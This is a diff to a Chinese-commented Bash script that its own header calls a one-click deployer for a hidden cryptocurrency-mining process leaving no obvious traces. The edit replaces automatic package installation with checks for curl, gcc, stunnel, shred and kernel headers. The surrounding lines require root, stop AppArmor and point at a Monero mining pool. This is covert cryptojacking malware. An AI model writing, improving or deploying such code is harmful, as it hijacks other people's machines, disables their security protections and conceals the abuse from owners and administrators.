@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# 隐藏挖矿进程的一键部署脚本（无明显挖矿痕迹）
+# 隐藏挖矿进程的一键部署脚本（无明显挖矿痕迹，已移除依赖安装）
 
 if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要 root 权限运行" 1>&2
@@ -19,30 +19,19 @@ if command -v aa-status &> /dev/null; then
     systemctl stop apparmor || echo "警告：无法停止 AppArmor"
 fi
 
-# 安装依赖
-if command -v apt-get &> /dev/null; then
-    echo "检测到基于 Debian 的系统，正在安装依赖..."
-    apt-get update -y
-    apt-get install -y curl tar gcc make stunnel4 linux-headers-$(uname -r) build-essential libdl-dev shred || { echo "依赖安装失败" 1>&2; exit 1; }
-elif command -v yum &> /dev/null; then
-    echo "检测到基于 Red Hat 的系统，正在安装依赖..."
-    yum install -y curl tar gcc make stunnel kernel-devel-$(uname -r) glibc-devel epel-release coreutils || { echo "依赖安装失败" 1>&2; exit 1; }
-else
-    echo "不支持的系统，请手动安装依赖" 1>&2
-    exit 1
-fi
-
-if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
-    echo "错误：内核头文件与当前内核版本 $(uname -r) 不匹配" 1>&2
-    exit 1
-fi
-
+# 检查必要命令是否存在
 for cmd in curl tar gcc make stunnel systemctl shred; do
     if ! command -v "$cmd" &> /dev/null; then
-        echo "错误：$cmd 未安装" 1>&2
+        echo "错误：$cmd 未安装，请手动安装所需依赖" 1>&2
         exit 1
     fi
 done
+
+# 检查内核头文件
+if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
+    echo "错误：内核头文件与当前内核版本 $(uname -r) 不匹配，请安装 linux-headers-$(uname -r)" 1>&2
+    exit 1
+fi
 
 # 用户输入
 pool_url="pool.getmonero.us:3333"
